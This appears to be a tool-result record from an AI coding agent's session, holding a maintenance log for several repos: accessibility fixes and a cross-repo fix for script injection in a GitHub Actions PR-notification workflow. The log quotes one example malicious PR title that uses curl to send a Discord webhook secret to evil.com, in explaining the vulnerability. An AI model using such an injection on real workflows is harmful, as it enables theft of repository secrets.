{"type":"user","message":{"role":"user","content":[{"tool_use_id":"toolu_013qoZ9zVQKxvGR9gXxoSjxP","type":"tool_result","content":"- Result: 0 lint errors, 0 type errors, 129 tests passing, build clean\n- Deployed to staging — 308 (auth redirect, app running correctly)\n\n### Survey findings (for future sessions)\n- **runeval**: Now has WCAG accessibility pass. All major repos now accessible (groceryGenius Run 40, promptlibrary Run 41, social-tools Run 44, runeval Run 45)\n- **Remaining a11y opportunities**: valueSortify, pezantTools (lower priority — simpler apps)\n- **All repos**: Clean audit, tests passing, CI active, branches clean\n\n---\n\n## 2026-03-20 — Run 46\n\n### What was done\n\n**valueSortify — WCAG accessibility pass (PR #23, auto-merged)**\n- **DraggableCard**: Removed broken keyboard drag handler (`controls.start(e)` requires pointer events, keyboard events thrown away by framer-motion), marked drag handle `aria-hidden`, added first-letter text labels (V/I/N) inside color-only category move buttons so color-blind users can distinguish targets\n- **GridView**: Wrapped `ValueCard` items in `role=\"listitem\"` elements to complete `role=\"list\"` semantics\n- **ResultsPhase**: Added Escape key and click-outside handlers to close export dropdown menu, added reset confirmation dialog (matching sorting/ranking phases — previously \"Start Over\" had no confirmation), `aria-hidden` on decorative Trophy icon\n- **SingleCardView**: Replaced hardcoded `aria-valuemax={83}` with dynamic `totalValues` prop passed from parent\n- **SortingPhase**: Added `aria-label` to view toggle button, `aria-hidden` on decorative Lucide icons (Layers, LayoutGrid, CreditCard, ArrowRight, RotateCcw)\n- **RankingPhase**: `aria-hidden` on decorative Lucide icons (RotateCcw, ArrowLeft, Trophy)\n- Result: 0 lint errors, 38 tests passing, build clean\n\n### Survey findings (for future sessions)\n- **valueSortify**: Now has WCAG accessibility pass. All major + mid-tier repos now accessible (groceryGenius Run 40, promptlibrary Run 41, social-tools Run 44, runeval Run 45, valueSortify Run 46)\n- **Remaining a11y opportunity**: pezantTools (server-rendered EJS templates — different approach needed)\n- **All repos**: Clean audit (except known unfixable transitive deps), tests passing, CI active, branches clean\n\n---\n\n## 2026-03-20 — Run 47\n\n### What was done\n\n**Cross-repo security fix: GHA script injection in PR Discord notification workflow (15 PRs merged)**\n\nThe `pr-notify.yml` workflow deployed to all 15 repos had a script injection vulnerability. PR title, body, URL, and author were interpolated directly into the shell `run:` block via `${{ github.event.pull_request.* }}` expressions. An attacker could craft a malicious PR title (e.g. `\"; curl http://evil.com?t=$MERGE_WEBHOOK #`) to execute arbitrary commands and exfiltrate Discord webhook secrets.\n\n**Fix applied to all 15 repos:**\n- groceryGenius (#58), pezantTools (#58), promptlibrary (#23), runeval (#45), youtubeSpeedSetAndRemember (#17), job-scraper (#11), activity-tracker (#5), valueSortify (#24), llm-tasks (#50), scripts (#12), waymo-sim (#11), llm-context (#1), runCoach (#1), reddit-bottom-sheet-blocker (#4), social-tools (#46)\n\n**Changes:**\n1. Moved all `github.event.pull_request.*` expressions from the shell `run:` block into `env:` variables — the standard mitigation for GHA script injection\n2. Replaced heredoc string interpolation for JSON payload with `jq -n --arg`, which properly escapes special characters and prevents JSON injection\n\n### Survey findings (for future sessions)\n- **pezantTools**: No ESLint configured, hardcoded fallback session secret in server.js\n- **activity-tracker**: No ESLint configured, has real daemon logic across multiple files\n- **reddit-bottom-sheet-blocker**: MutationObserver fires storage read on every DOM mutation (perf concern), placeholder Firefox extension ID, binary zip committed\n- **waymo-sim**: No Python linter (ruff/flake8/mypy), unpinned deps in requirements.txt","is_error":false}]},"parent_tool_use_id":null,"session_id":"5b7f6b64-0aaf-4a9a-8cd4-da0bdd181d0d","uuid":"0c1214ea-185d-49fd-91ae-a925bdc13c2e","timestamp":"2026-03-20T14:12:21.314Z","tool_use_result":{"stdout":"- Result: 0 lint errors, 0 type errors, 129 tests passing, build clean\n- Deployed to staging — 308 (auth redirect, app running correctly)\n\n### Survey findings (for future sessions)\n- **runeval**: Now has WCAG accessibility pass. All major repos now accessible (groceryGenius Run 40, promptlibrary Run 41, social-tools Run 44, runeval Run 45)\n- **Remaining a11y opportunities**: valueSortify, pezantTools (lower priority — simpler apps)\n- **All repos**: Clean audit, tests passing, CI active, branches clean\n\n---\n\n## 2026-03-20 — Run 46\n\n### What was done\n\n**valueSortify — WCAG accessibility pass (PR #23, auto-merged)**\n- **DraggableCard**: Removed broken keyboard drag handler (`controls.start(e)` requires pointer events, keyboard events thrown away by framer-motion), marked drag handle `aria-hidden`, added first-letter text labels (V/I/N) inside color-only category move buttons so color-blind users can distinguish targets\n- **GridView**: Wrapped `ValueCard` items in `role=\"listitem\"` elements to complete `role=\"list\"` semantics\n- **ResultsPhase**: Added Escape key and click-outside handlers to close export dropdown menu, added reset confirmation dialog (matching sorting/ranking phases — previously \"Start Over\" had no confirmation), `aria-hidden` on decorative Trophy icon\n- **SingleCardView**: Replaced hardcoded `aria-valuemax={83}` with dynamic `totalValues` prop passed from parent\n- **SortingPhase**: Added `aria-label` to view toggle button, `aria-hidden` on decorative Lucide icons (Layers, LayoutGrid, CreditCard, ArrowRight, RotateCcw)\n- **RankingPhase**: `aria-hidden` on decorative Lucide icons (RotateCcw, ArrowLeft, Trophy)\n- Result: 0 lint errors, 38 tests passing, build clean\n\n### Survey find